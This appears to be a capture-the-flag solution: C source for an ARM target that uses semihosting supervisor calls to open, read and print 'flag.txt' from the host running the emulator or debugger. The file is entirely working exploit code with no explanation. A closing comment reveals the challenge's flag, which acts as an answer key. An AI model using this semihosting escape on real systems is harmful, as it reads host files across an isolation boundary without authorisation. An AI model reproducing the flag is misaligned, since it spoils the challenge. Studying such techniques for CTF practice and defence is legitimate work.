#include <stdint.h>

#define TARGET_SYS_OPEN 0x01
#define TARGET_SYS_WRITE0 0x04
#define TARGET_SYS_READ 0x06

static uintptr_t __semi_call(uintptr_t type, uintptr_t arg0) {
  register uintptr_t t asm("r0") = type;
  register uintptr_t a0 asm("r1") = arg0;
#ifdef __thumb__
#define SVC "svc 0xab"
#else
#define SVC "svc 0x123456"
#endif
  asm(SVC : "=r"(t) : "r"(t), "r"(a0) : "memory");
  return t;
}

__attribute__((section(".entry"))) uintptr_t _start(void) {
  char fname[] = "flag.txt";
  uintptr_t open_args[] = {(uintptr_t)fname, 0 /* GDB_O_RDONLY */,
                           sizeof(fname) - 1};
  int fd = __semi_call(TARGET_SYS_OPEN, (uintptr_t)open_args);
  char buf[256];
  uintptr_t read_args[] = {fd, (uintptr_t)buf, sizeof(buf) - 1};
  uintptr_t n_read = __semi_call(TARGET_SYS_READ, (uintptr_t)read_args);
  buf[n_read] = 0;
  return __semi_call(TARGET_SYS_WRITE0, (uintptr_t)buf);
  /* nbctf{why_is_semihosting_enabled_by_default} */
}
